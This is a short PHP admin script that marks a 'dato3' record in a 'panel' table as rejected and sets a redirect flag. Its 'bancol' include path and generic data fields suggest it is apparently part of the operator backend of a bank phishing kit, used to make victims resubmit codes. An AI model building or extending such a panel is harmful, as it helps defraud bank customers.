<?php
require_once '../bancol/config.php';

if (!isset($_SESSION['admin_logged_in'])) {
    http_response_code(403);
    exit(json_encode(['status' => 'error', 'message' => 'Acceso denegado']));
}

$conn = getConnection();
$uuid = $conn->real_escape_string($_GET['id'] ?? '');
$reason = $conn->real_escape_string($_POST['reason'] ?? '');

// Validar UUID
if (empty($uuid) || !preg_match('/^[a-f0-9\-]{36}$/i', $uuid)) {
    http_response_code(400);
    exit(json_encode(['status' => 'error', 'message' => 'ID inválido']));
}

// Actualizar base de datos
$stmt = $conn->prepare("UPDATE  panel 
    SET dato3_status = 'rejected', 
        redirect_flag = 1,
        rejected_reason = ? 
    WHERE id = ?");
$stmt->bind_param("ss", $reason, $uuid);

if ($stmt->execute()) {
    if ($stmt->affected_rows > 0) {
        echo "OK"; // Respuesta esperada
    } else {
        http_response_code(404);
        echo "No se actualizó ningún registro";
    }
} else {
    http_response_code(500);
    error_log("Error en rechazar_dato3.php: " . $stmt->error); // Registrar error
    echo "Error interno del servidor";
}

$stmt->close();
$conn->close();
exit();